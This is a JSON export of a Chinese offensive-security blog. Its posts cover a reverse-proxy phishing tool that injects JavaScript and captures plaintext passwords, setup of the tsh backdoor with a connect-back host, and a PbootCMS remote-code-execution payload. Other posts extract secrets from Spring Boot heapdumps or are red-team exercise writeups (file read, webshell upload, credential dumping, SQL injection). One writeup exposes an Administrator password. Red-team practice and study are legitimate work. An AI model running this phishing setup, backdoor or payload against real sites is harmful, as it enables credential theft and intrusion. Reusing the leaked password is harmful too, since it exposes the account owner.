{"meta":{"title":"cances","subtitle":"","description":"cances 的 学习笔记","author":"cances","url":"https://canc3s.github.io","root":"/"},"pages":[{"title":"","date":"2021-01-30T13:50:10.231Z","updated":"2021-01-30T13:50:10.231Z","comments":true,"path":"404.html","permalink":"https://canc3s.github.io/404","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"文章分类","date":"2021-01-30T11:07:02.042Z","updated":"2021-01-30T11:07:02.042Z","comments":true,"path":"blog/categories/index.html","permalink":"https://canc3s.github.io/blog/categories/","excerpt":"","text":""},{"title":"Page","date":"2013-12-26T14:52:56.000Z","updated":"2020-12-23T06:06:21.162Z","comments":true,"path":"page/index.html","permalink":"https://canc3s.github.io/page/","excerpt":"","text":"This is a page test."},{"title":"我的朋友们","date":"2021-01-30T15:33:10.564Z","updated":"2021-01-30T15:33:10.564Z","comments":true,"path":"blog/friends/index.html","permalink":"https://canc3s.github.io/blog/friends/","excerpt":"","text":""},{"title":"所有标签","date":"2021-01-30T11:07:37.591Z","updated":"2021-01-30T11:07:37.591Z","comments":true,"path":"blog/tags/index.html","permalink":"https://canc3s.github.io/blog/tags/","excerpt":"","text":""},{"title":"","date":"2021-01-30T13:12:09.539Z","updated":"2021-01-30T13:12:09.539Z","comments":true,"path":"blog/tool/exec.html","permalink":"https://canc3s.github.io/blog/tool/exec","excerpt":"","text":""},{"title":"","date":"2021-01-07T15:01:42.200Z","updated":"2021-01-07T15:01:42.200Z","comments":true,"path":"blog/tool/getav.html","permalink":"https://canc3s.github.io/blog/tool/getav","excerpt":"","text":""},{"title":"","date":"2021-01-07T15:01:39.832Z","updated":"2021-01-07T15:01:39.832Z","comments":true,"path":"blog/tool/getmskb.html","permalink":"https://canc3s.github.io/blog/tool/getmskb","excerpt":"","text":""},{"title":"所有工具","date":"2021-01-30T13:04:19.884Z","updated":"2021-01-30T13:04:19.884Z","comments":true,"path":"blog/tool/index.html","permalink":"https://canc3s.github.io/blog/tool/","excerpt":"","text":""}],"posts":[{"title":"基于反向代理的水坑攻击","slug":"基于反向代理的水坑攻击","date":"2021-03-12T15:30:04.000Z","updated":"2021-03-15T06:16:07.856Z","comments":true,"path":"2021/03/12/","link":"","permalink":"https://canc3s.github.io/2021/03/12/","excerpt":"","text":"完整项目代码：https://github.com/canc3s/judas 该文章是看到倾旋大佬《红队技巧：基于反向代理的水坑攻击》后的一系列实践与思考。 前言关于网站克隆方面，可以分两种，一种是利用 SET，CS，copysite 等工具，通过copy网站的html，js，css等资源文件来达到镜像网站的目的。第二种就是利用 Nginx, OpenResty 等反向代理工具反代目标网站，充当中间人。本文介绍的工具属于第二种，有下面几个特点 程序轻量，支持快速部署和移植，跨平台。（其实都是golang的优点） 可以完美克隆任意网站，并任意篡改通信过程和植入恶意js。 有可拓展性，有插件功能，可以根据自己的需求任意编写。 代理支持http和socks代理，端口、https证书可以轻松更改，可以应对更加复杂的场景。 用法1234567891011121314151617181920212223Usage of judas: -address string Address and port to run proxy service on. Format address:port. (default &quot;localhost:8080&quot;) -inject-js string URL to a JavaScript file you want injected. -insecure Listen without TLS. -insecure-target Not verify SSL certificate from target host. -plugins string Colon separated file path to plugin binaries. -proxy string Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150. -proxy-ca-cert string Proxy CA cert for signed requests -proxy-ca-key string Proxy CA key for signed requests -ssl-hostname string Hostname for SSL certificate -target string The website we want to phish. -with-profiler Attach profiler to instance. 注入js注入恶意的js代码，其实就是xss能做的事情，表单劫持，jsonp，屏幕截图，键盘记录，csrf。。。总之，页面都能控制了，还是蛮强大的。 注入js方面，有几个地方需要考虑。一、什么样的页面注入js，怎么去判断。judas项目最开始的判断是简单的 Content-Type 中包含 text/html 就向响应包的head标签中注入payload。 1234567891011121314if !strings.Contains(response.Header.Get(&quot;Content-Type&quot;), &quot;text/html&quot;) &#123; return nil&#125;document, err := goquery.NewDocumentFromResponse(response)if err != nil &#123; return err&#125;payload := fmt.Sprintf(&quot;&lt;script type=&#x27;text/javascript&#x27; src=&#x27;%s&#x27;&gt;&lt;/script&gt;&quot;, p.JavascriptURL)selection := document. Find(&quot;head&quot;). AppendHtml(payload). Parent() 后来在使用过程中反代一些网站的时候，有些网站出现了异常，页面不能正常显示，功能也无法正常使用。经过排查发现问题出在了有些页面Content-Type不规范，返回js和一些数据时，虽然不是html页面，但Content-Type中却存在html字段，因此，为了解决这个兼容问题，我增加了对页面内容的判断，至于为什么要取前100个字符，是因为有些js当中也存在&lt;html关键字，还是为了减少错误的判断。 123456789if !strings.Contains(response.Header.Get(&quot;Content-Type&quot;), &quot;text/html&quot;)&#123; return nil&#125;html, _ := ioutil.ReadAll(response.Body)response.Body = ioutil.NopCloser(bytes.NewBuffer(html))if !bytes.Contains(html[:100], []byte(&quot;&lt;html&quot;))&#123; return nil&#125; 还有一个细节是，我也更改了js注入的位置，也是因为倾旋大佬在JS模块开发这片文章里提到的一点。现阶段大部分网站已经解决了明文传输的问题，基本上很多都是通过JS进行加密，这让获取明文密码变得更加“麻烦了点”。 因为在js里出现同名函数后，你在web页面里调用改js函数后，总是调用页面中最后一个加载的函数。所以，为了更好的去劫持js用户的信息，js最好可以让页面最后一个加载。下面举个通俗的🌰。 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; &lt;html&gt;&lt;head&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;./1.js&quot;&gt;&lt;/script&gt;&lt;!-- function aa() &#123; alert(&#x27;First bb&#x27;) &#125; --&gt;&lt;script type=&quot;text/javascript&quot;&gt; function aa() &#123; alert(&#x27;First aa&#x27;) &#125; &lt;/script&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;&lt;br /&gt;&lt;input id=&quot;Button1&quot; type=&quot;button&quot; value=&quot;button&quot; onclick=&quot;aa();&quot;/&gt; &lt;/form&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;./2.js&quot;&gt;&lt;/script&gt;&lt;!-- function aa() &#123; alert(&#x27;Second bb&#x27;) &#125; --&gt;&lt;script type=&quot;text/javascript&quot;&gt; function aa(s) &#123; alert(&#x27;Second aa&#x27;); &#125; function aa(s) &#123; alert(&#x27;Last aa&#x27;); &#125;&lt;/script&gt;&lt;/html&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;./3.js&quot;&gt;&lt;/script&gt;&lt;!-- function aa() &#123; alert(&#x27;Last bb&#x27;) &#125; --&gt; 尝试猜猜点击Button1后，弹出框的内容是什么。。 因此，当有前端加密的网站，我们就可以去篡改他的js，使其在提交加密后的数据都同时，想服务器或者我们的服务器提交明文，后面会举个🌰。 使用ssl证书使用ssl证书这部分该工具原版也是有问题的现在已经改好了，大家可以直接使用。下面就是使用的例子，实验时使用的是let‘s encrypt申请的免费证书，可以正常使用。 1./judas --address=0.0.0.0:443 --target https://www.baidu.com/ -proxy-ca-cert /etc/letsencrypt/live/site.com/cert.pem -proxy-ca-key /etc/letsencrypt/live/site.com/privkey.pem -ssl-hostname site.com 支持代理代理支持http和socks代理，方便的代理使得该工具可以应对的场景也变多，比如，要反代的网站不在公网上等等。。。 插件功能作者整体使用介绍都写的很粗糙，但好在代码注释蛮清晰，暂时理解的主要是可以自定义Listen、RequestTransformer、ResponseTransformer三个函数。 RequestTransformer和ResponseTransformer函数主要是用来劫持请求包和响应包的，做一些自定义。Listen用来做剩下的事情。 123456789101112131415161718192021222324252627282930313233// Listen pulls search queries out of HTTP exchangesfunc (p *searchLoggingPlugin) Listen(exchanges &lt;-chan *judas.HTTPExchange) &#123; for exchange := range exchanges &#123; searchQuery := exchange.Request.URL.Query().Get(&quot;q&quot;) if searchQuery != &quot;&quot; &amp;&amp; exchange.Request.URL.Host == exchange.Target.Host &#123; p.logger.Printf(&quot;Search query: %s&quot;, searchQuery) &#125; &#125;&#125;// New returns a plugin that logs searches.func New(logger *log.Logger) (judas.Listener, error) &#123; return &amp;searchLoggingPlugin&#123;logger: logger&#125;, nil&#125;// RequestTransformer replaces a victim&#x27;s search query with something else if they search for the words &quot;modify request&quot;.func RequestTransformer(request *http.Request) error &#123; if request.URL.Query().Get(&quot;q&quot;) == &quot;modify request&quot; &#123; query := request.URL.Query() query.Set(&quot;q&quot;, &quot;not what you searched for&quot;) request.URL.RawQuery = query.Encode() &#125; return nil&#125;// ResponseTransformer replaces the page contents with our text when a user searches for the word &quot;replace&quot;.func ResponseTransformer(response *http.Response) error &#123; if response.Request.URL.Query().Get(&quot;q&quot;) == &quot;replace&quot; &#123; payload := []byte(&quot;payload&quot;) response.Body = ioutil.NopCloser(bytes.NewReader(payload)) &#125; return nil&#125; 作者写的这个插件就是在日志中记录请求包中q参数的值，并当q参数等于一些特定值时对请求包和响应包进行中间人修改。 123456func (p *requestloggingplugin) Listen(exchanges &lt;-chan *judas.HTTPExchange) &#123; for exchange := range exchanges &#123; request, _ := httputil.DumpRequest(exchange.Request.Request, true) p.logger.Printf(&quot;\\nrequest: %v\\n&quot;, string(request)) &#125;&#125; 这是我写的一个插件，就是用来记录请求包内容的，拓展一些功能还是蛮简单的。 通信过程加密的例子这个是原来提交密码的请求包 尝试在请求包中添加两个字段，确认一下添加的多余字段不会影响请求。 在网站中查找到点击登陆后触发的事件，重点是要找到发包那个函数。（其实要比查找加密那个稍微简单一些，因为没有发包一般没有依赖） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576... &lt;div class=&quot;control-group&quot;&gt; &lt;a class=&quot;btn btn-primary btn-large btn-block&quot; href=&quot;javascript:void(0);&quot; lay-submit=&quot;&quot; lay-filter=&quot;save&quot; id=&quot;btn-login&quot;&gt;登 录&lt;/a&gt; &lt;/div&gt;...&lt;script type=&quot;text/javascript&quot;&gt; layui.use([&#x27;form&#x27;], function () &#123; var form = layui.form, $ = layui.jquery, layer = layui.layer; $(document).keydown(function (event) &#123; if (event.keyCode == 13) &#123; $(&quot;#btn-login&quot;).click(); &#125; &#125;); //监听提交 form.on(&#x27;submit(save)&#x27;, function (data) &#123; var index = layer.msg(&#x27;正在登录，请耐心等待...&#x27;, &#123; icon: 16 , shade: 0.01 &#125;); var v1 = data.field.username; var v2 = data.field.password; $.ajax(&#123; url: &#x27;/admin/getKey&#x27;, type: &#x27;post&#x27;, async: false, success: function (result) &#123; var key = CryptoJS.enc.Utf8.parse(result); var src1 = CryptoJS.enc.Utf8.parse(v1); v1 = CryptoJS.AES.encrypt(src1, key, &#123; mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 &#125;).toString(); var src2 = CryptoJS.enc.Utf8.parse(v2); v2 = CryptoJS.AES.encrypt(src2, key, &#123; mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 &#125;).toString(); &#125; &#125;); $(&quot;#btn-login&quot;).attr(&quot;disabled&quot;, &quot;disabled&quot;); $.ajax(&#123; url: &#x27;/admin/login&#x27;, type: &#x27;post&#x27;, dataType: &#x27;json&#x27;, async: false, data: &#123; &quot;verifyCode&quot;: data.field.verifyCode, &quot;v1&quot;: v1, &quot;v2&quot;: v2 &#125;, success: function (resp) &#123; layer.close(index); $(&quot;#btn-login&quot;).removeAttr(&quot;disabled&quot;); if (resp.code == 0) &#123; if (resp.message.length &gt; 4) &#123; layer.confirm(resp.message, function () &#123; self.location = &#x27;/admin/index&#x27; &#125;); &#125; else &#123; self.location = &#x27;/admin/index&#x27; &#125; &#125; else &#123; layer.msg(resp.message); $(&#x27;#verifyCode&#x27;).attr(&#x27;src&#x27;, &quot;/admin/getKaptcha&quot; + new Date()); &#125; &#125;, error: function () &#123; layer.close(index); $(&quot;#btn-login&quot;).removeAttr(&quot;disabled&quot;); layer.alert(&quot;登录失败&quot;); &#125; &#125;); &#125;); &#125;); ... 找到ajax发包的部分进行修改，让发送加密字段的同时发送明文（创造一个密码明文传输的漏洞）。 123456789101112$.ajax(&#123; url: &#x27;/admin/login&#x27;, type: &#x27;post&#x27;, dataType: &#x27;json&#x27;, async: false, data: &#123; &quot;verifyCode&quot;: data.field.verifyCode, &quot;v1&quot;: v1, &quot;v2&quot;: v2, &quot;username&quot;: data.field.username, &quot;password&quot;: data.field.password &#125;, 然后尝试场景是否成功。 1go run cmd/judas.go --address=0.0.0.0:8081 --target https://xx.xx.com/ --inject-js http://xx.xx/InBx --insecure --plugins ./requestloggingplugin.so 可以看到原版加密传输的密码后面跟了一份明文的，问题也就迎刃而解了。其实解决的方法不止这一种，直接劫持内容也可以，只不过需要单独定制插件了。 总结工具虽然有优点，但也有一些缺点： 暂时不支持根据不同的host指向不同的网站 对于过多的并发请求处理不如Nginx。（手动测试同时200个请求以上访问有波动）","categories":[{"name":"红蓝技巧","slug":"红蓝技巧","permalink":"https://canc3s.github.io/categories/%E7%BA%A2%E8%93%9D%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"工具指南","slug":"工具指南","permalink":"https://canc3s.github.io/tags/%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/"},{"name":"红蓝对抗","slug":"红蓝对抗","permalink":"https://canc3s.github.io/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://canc3s.github.io/tags/%E9%92%93%E9%B1%BC/"},{"name":"golang","slug":"golang","permalink":"https://canc3s.github.io/tags/golang/"}]},{"title":"cSubsidiary和cDomain使用指南","slug":"cSubsidiary和cDomain使用指南","date":"2021-03-01T15:30:04.000Z","updated":"2021-03-01T07:59:46.304Z","comments":true,"path":"2021/03/01/","link":"","permalink":"https://canc3s.github.io/2021/03/01/","excerpt":"","text":"github地址：cSubsidiary和cDomain 不管是打比赛还是src，天眼查都是整理资产的利器。。。 查询多级子公司1./cSubsidiary_darwin_amd64 -n 字节跳动 -p 49 -w 0 -o Subsidiary.txt &amp;&amp; ./cSubsidiary_darwin_amd64 -f Subsidiary.txt 批量查询子公司域名1./cSubsidiary_darwin_amd64 -n 字节跳动 -o Subsidiary.txt &amp;&amp; ./cDomain_darwin_amd64 -f Subsidiary.txt 携带cookie因为cookie有效时间很长，而且cookie又很长，所以可以这样去使用。 mac12Cookie=&quot;TYCID=d167e900387111ebb03dc06df; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22.....&quot;./cSubsidiary_darwin_amd64 -n 字节跳动 -o Subsidiary.txt -c $Cookie &amp;&amp; ./cDomain_darwin_amd64 -f Subsidiary.txt -c $Cookie windows12set Cookie=&quot;TYCID=d167e900387111ebb03dc06df; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22.....&quot;cSubsidiary.exe -n 字节跳动 -o Subsidiary.txt -c %Cookie% &amp;&amp; cDomain.exe -f Subsidiary.txt -c %Cookie%","categories":[{"name":"信息收集","slug":"信息收集","permalink":"https://canc3s.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://canc3s.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"工具指南","slug":"工具指南","permalink":"https://canc3s.github.io/tags/%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/"},{"name":"信息收集","slug":"信息收集","permalink":"https://canc3s.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"spring boot之heapdump","slug":"spring-boot之heapdump","date":"2021-02-03T15:30:04.000Z","updated":"2021-03-15T06:15:31.818Z","comments":true,"path":"2021/02/03/","link":"","permalink":"https://canc3s.github.io/2021/02/03/","excerpt":"","text":"准备工作首先要获取heapdump。从http://www.xx.com/heapdump获取调用栈相关信息，如果是 sping boot 2.x 的话路径就是：http://www.xx.com/actuator/heapdump 然后下载 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文或者其他敏感信息。 使用 Eclipse Memory Analyzer 是无法直接打开下载的 heapdump 文件的，需要改后缀为 .hprof 更改后缀之后就可以成功打开了 还有个注意事项是，内存如果解压出来，比如当前我解压出来 1.46G ，那么在 MemoryAnalyzer.ini 这个文件当中需要将内存设置为大于这个大小，我设置为 2G ，否则会报错。我的文件没那么大，所以就不需要修改了。 搜索敏感信息点击 OQL 标签，在查询框中输入语句进行查询 1select * from org.springframework.web.context.support.StandardServletEnvironment 然后点击红色感叹号执行查询。 也可以定位关键词进行查询 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;user&quot;)) or (toString(x.key).contains(&quot;pass&quot;)) 拓展一下也可以直接搜accessKey 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;accessKey&quot;)) 我这个里面没有。。。 借一张xray社区的图 wx，app等等。。。都可以搜 还有一种查看方式就是通过 Top Consumers 然后根据包的结构去查看自己感兴趣的东西，比如我此处的 druid 比如此处就能看到一台sqlserver的连接信息（ip，账号，密码）。 参考记一次信息泄漏到RCE Eclipse Memory Analyzer —— MAT查找内存泄漏工具","categories":[{"name":"web安全","slug":"web安全","permalink":"https://canc3s.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://canc3s.github.io/tags/web/"},{"name":"java","slug":"java","permalink":"https://canc3s.github.io/tags/java/"}]},{"title":"tsh","slug":"tsh","date":"2021-01-30T15:30:04.000Z","updated":"2021-03-12T13:14:38.099Z","comments":true,"path":"2021/01/30/","link":"","permalink":"https://canc3s.github.io/2021/01/30/","excerpt":"","text":"介绍下载地址：https://github.com/orangetw/tsh 功能： 通信加密 支持上传、下载、直接反弹shell tsh.h文件，用来配置生成的tsh 12345678910111213141516#ifndef _TSH_H#define _TSH_Hchar *secret = &quot;rc9c0r0e72t5ag0pl79a75c54r1d&quot;; //加密密码#define SERVER_PORT 8888 //SERVER端口#define FAKE_PROC_NAME &quot;/bin/bash&quot; //进程名#define CONNECT_BACK_HOST &quot;10.0.0.8&quot; //反连ip#define CONNECT_BACK_DELAY 60 //反连周期#define GET_FILE 1#define PUT_FILE 2#define RUNSHELL 3#endif /* tsh.h */ 编译tsh 1234#可选平台#linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osfmake linux 正向编译tshd时下面两行必须注释 12//#define CONNECT_BACK_HOST &quot;10.0.0.8&quot; //反连ip//#define CONNECT_BACK_DELAY 60 //反连周期 被控端 1.&#x2F;tshd netstat 这边没什么异样 lsof 可以看到执行的进程是 tshd 所以运行时可以改个诱惑性的名字,运行完之后可以直接删除文件。不影响后面的使用，除非进程被清理掉或者系统关机。 看看ps -ef 攻击者 1./tsh 被控端ip 反向不需要注释，直接编译。 被控端 1.&#x2F;tshd netstat 也没有什么异样 看看ps -ef 运行完之后也是可以直接删除文件。 攻击者 1.&#x2F;tsh cb 总结 默认配置的tsh有两个特点，一是进程名为/bin/bash，用ps -ef看其实挺突兀的，很容易辨别。二是父进程pid是1。 还有一个识别的技巧就是用netstat, ps -ef, lsof 几个工具都试试结果对比一下，排除出来的概率还是比较大的。所以做攻击也是需要去思考。 为了通信过程的安全，作者建议 secret 最好多于12位，只要 secret 一致，tsh 和 tshd 就可以通信。也就是说，secret 太弱，可以爆破出来（但不知道好不好实现，看看tshd有没有特别的指纹）","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://canc3s.github.io/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://canc3s.github.io/tags/linux/"},{"name":"权限维持","slug":"权限维持","permalink":"https://canc3s.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"1月内部红蓝","slug":"1月内部红蓝","date":"2021-01-26T15:30:04.000Z","updated":"2021-02-03T13:09:47.267Z","comments":true,"path":"2021/01/26/","link":"","permalink":"https://canc3s.github.io/2021/01/26/","excerpt":"","text":"1月内部红蓝代码审计看到网站直接试admin就进后台了，然后上github找到了PbootCMS项目，尝试默认口令，admin:123456就进后台了。考点肯定不是这个。。。 后来群里有人说有网站备份文件，访问wwwroot.zip下载到网站备份文件。浏览了一下发现有些缓存文件，访问后得到绝对路径。 其实这次的靶场应该是某次CTF的原题，但环境是一开始是php5.4，尝试了一些方法没成功。好在后来环境还是换成php7所以成功shell了。 代码审计部分，某篇先知文章已经写过了，这里简单写写。首先定位eval函数，全站就一处，但严防死守。 12345678910111213141516171819202122232425262728293031$white_fun = array( &#x27;date&#x27;, &#x27;in_array&#x27;, &#x27;explode&#x27;, &#x27;implode&#x27;);// 还原可能包含的保留内容，避免判断失效$matches[1][$i] = $this-&gt;restorePreLabel($matches[1][$i]);// 带有函数的条件语句进行安全校验if (preg_match_all(&#x27;/([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\&lt;\\&gt;\\%\\w\\s\\\\\\\\]+)?\\(/i&#x27;, $matches[1][$i], $matches2)) &#123; foreach ($matches2[1] as $value) &#123; if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123; $danger = true; break; &#125; &#125;&#125;// 过滤特殊字符串if (preg_match(&#x27;/(\\$_GET\\[)|(\\$_POST\\[)|(\\$_REQUEST\\[)|(\\$_COOKIE\\[)|(\\$_SESSION\\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)/i&#x27;, $matches[1][$i])) &#123; $danger = true;&#125;// 如果有危险函数，则不解析该IFif ($danger) &#123; continue;&#125;eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;); 首先设置了可以使用函数的白名单，假如使用除白名单以外的函数回被识别为danger。这里限制了调用了函数，在KCon2019大会上的提出的新特性也过滤掉了，导致调用函数基本不成可能。 第二个正则是限制了一些黑名单关键字，其中限制了include，但没有限制require，第一天看代码时眼花，把request看成require了。。。 后台有很多上传点，但都是白名单，绕不过。所以就就可以和这里结合（文件包含+文件上传=shell）。 1&#123;pboot:if(1)require &quot;static/upload/image/xxxxxxx/1611416284187820.jpg&quot;;//)&#125;sdfsd&#123;/pboot:if&#125; 该功能最简单触发的地方就是标题样式这里。 填入之后发现并没有触发。通过调试发现前面还有一些别的处理，导致失败。一个就是pboot:if变成了pboot@if导致标签无法正常触发。 12345678910function filter($varname, $condition)&#123;... if (is_string($data)) &#123; $data = trim($data); // 去空格 $data = preg_replace_r(&#x27;/(x3c)|(x3e)/&#x27;, &#x27;&#x27;, $data); // 去十六进制括号 $data = preg_replace_r(&#x27;/pboot:if/i&#x27;, &#x27;pboot@if&#x27;, $data); // 过滤插入cms条件语句 &#125;...&#125; 但后来找到了先知那篇文章，发现大佬利用密码不允许显示的空子的地方bypass了。 但还有一个问题没有解决。payload中的 “ 被html实体编码了。 但是因为php5和函数被过滤的原因，暂时没想到解决的办法。。。好在，最后php环境切换了，所以，直接上paylaod。 1&#123;pboot&#123;user:password&#125;:if(1)(sys.tem)(((ne.xt)((getallheade.rs)())));;//)&#125;sdfsd&#123;/pboot:if&#125; 上面那些都是在本地环境测试的。为了可以直接使用我准备好的exp我需要把url地址模式调为兼容模式。 然后在标题样式处填入paylaod 然后打paylaod，Cookie里填要执行的命令。发现是system权限，而且 system 没有被disable。 为了更方便的操作，把之前传好的jpg copy成php放在网站根目录。 然后就shell了，拿到服务器权限。信息收集看了一下，好像真的只是一台vps，没有内网，估计是到此为止了，上机器去看看。 mimikatz抓密码，结果解不出来。 既然服务器是server2012那就试试PTH-RDP。结果失败。。。应该是组策略的原因。 新建用户，然后利用incognito提升到system权限，然后 tscon 2 切过去。截图，结束战斗。。。 参考：PbootCMS V3.0.1任意代码执行","categories":[{"name":"内部红蓝记录","slug":"内部红蓝记录","permalink":"https://canc3s.github.io/categories/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"https://canc3s.github.io/tags/web/"},{"name":"内部红蓝","slug":"内部红蓝","permalink":"https://canc3s.github.io/tags/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/"},{"name":"php","slug":"php","permalink":"https://canc3s.github.io/tags/php/"}]},{"title":"通过NS服务器收集域名","slug":"通过NS服务器收集域名","date":"2020-12-30T15:30:04.000Z","updated":"2021-01-30T16:19:38.956Z","comments":true,"path":"2020/12/30/","link":"","permalink":"https://canc3s.github.io/2020/12/30/","excerpt":"","text":"通过NS服务器收集域名其技术原理是向dns发送一个解析请求，看是否有返回ns信息，如果有的话将会使用该ns信息与历史沉淀下的dns数据信息进行交叉对比，最后返回一个n个不同的域名使用同一个ns服务器的列表。 这种域名收集方式比较适合有自建DNS服务器且有大量一级域名的大型企业。比如，BAT。 利用手段 以百度为例 首先通过nslookup，查询到一些已知域名的NS服务器。 12nslookupset type=ns 通过已知的一些一级域名，查询出该公司在使用的一些ns服务器。 当然也要注意有些一级域名可以并不是用的自己的NS服务器，还需要进一步判断 然后整理收集到的NS服务器 12345678dns.baidu.comns1.baidu.comns2.baidu.com...sv1.bdydns.cnsv2.bdydns.cnsv3.bdydns.cn... 然后利用ns服务器历史解析记录的调用接口一一查询 查找ns服务器的免费接口调用地址: https://api.hackertarget.com/findshareddns/?q=ns1.dnsserver.com 然后，整理，去重，验证是否真的是该公司资产。 最后 越大型的互联网公司，效果越好 大部分ns服务器都有命名规律，如ns1,ns2…… 有时候公司虽然有自己的dns服务器，但是仍然会使用一些服务器厂商的dns 存在并不是该公司的资产，但仍然解析到该公司dsn服务器的情况。（数量不多） 因为存在上面两种情况，所以写自动化脚本递归查询时需要增加验证。","categories":[{"name":"资产收集","slug":"资产收集","permalink":"https://canc3s.github.io/categories/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://canc3s.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"域名","slug":"域名","permalink":"https://canc3s.github.io/tags/%E5%9F%9F%E5%90%8D/"}]},{"title":"12月内部红蓝","slug":"12月内部红蓝","date":"2020-12-26T15:30:04.000Z","updated":"2021-01-30T16:28:55.476Z","comments":true,"path":"2020/12/26/","link":"","permalink":"https://canc3s.github.io/2020/12/26/","excerpt":"","text":"12月内部红蓝任意文件读取在12月的一个周末内部攻防群里发来了，攻防vpn信息和目标网站的域名。通过使用nmap扫描端口发现一共有两个正常的网站，一个是全球车辆定位系统 另一个是用zblog搭建的一个博客通知系统。 通过简单的猜测找到博客系统的后台后件但测试了几个弱口令没有进去，然后就去看另一个站了。乍一看，是个全“静态“网站，直接放一个图片在网站上，是攻防比赛时某些防守方的惯用手段，只有一个登陆可以点，但是点击登陆后返回功能被废弃。 正当感觉这个网站一个功能点没有，可以回去看之前那个站时，刷新网站有一条流量引起了我的注意。 看这个参数感觉像是有任意文件读取的样子，经过尝试发现确实是个最经典的任意文件读取。去读shadow没读出来，但可以读出来root的history文件，还有不少收获，顺势读了第一个flag。 虽然history里有操作备份文件的记录，但是我没猜到备份文件在哪，然后，准备读读网站有些什么文件，看有没有别的利用点时，发现网站竟然还有目录遍历。。 发现不明文件一个，用任意文件读取后发现是一句话，后来一看文件创建时间后感觉应该有别的大佬已经捷足先登了，那我就顺势骑马拿站了。 当时没注意到php7直接去拿菜刀和蚁剑去连了，没连上，所以后面一段操作其实都是直接用hackbar操作的。因为set_magic_quotes_runtime的原因，大部分的一句话连接工具都连不上php7的一句话shell（但我最后用有一版C刀连上了。。。老工具都是神器 🤨） 然后在/root/下找到了第二个flag，找到了多个网站备份文件，其中一个是zblog。 利用文件读取下载下来后，解压发现了惊喜——后台账号密码。 进入后台就是老套路了，网站设置修改网站上传文件的白名单，附件上传处上传webshell，成功getshell，没有任何过滤和waf，一气呵成。 紧接着也是常规操作，抓密码（Administrator:&#x77;&#97;&#x6e;&#x67;&#x77;&#x65;&#x69;&#64;&#x31;&#x30;&#48;&#46;&#x32;&#48;&#x33;），登陆rdp，发现第三个flag。 上面那个全球车辆定位系统为什么当时没有用一句话写个自己的shell其实是因为php权限比较低，web目录没有写权限，然后通过猜密码成功登陆172.16.100.203，内网以ip地址为变量的密码还是特别常见的。 sql注入通过netstat发现172.16.100.203机器和192.168.0.101有链接。扫端口发现只有22和80开启。尝试猜密码去连接101试图直接shell，结果失败了。访问80端口 点击帮助手册时发现了一条流量疑似有注入点 经过简单的测试发现确实是注入点，int类型。但。。好像过滤了蛮多关键字 经过尝试，发现关键字进行部分url编码后就可直接过滤，然后设置burp替换规则就可以sqlmap一把梭了。 一开始注数据时发现ua_info表中数据和user_info表中的用户一样，所以就只跑了ua_info表中的数据，发现四个用户hash都解不开，然后尝试了截取前16位也没成功。后来山穷水尽之时，dump了user_info表中的数据，发现user_info表中有五个用户，第五个用户密码刚好能解开。 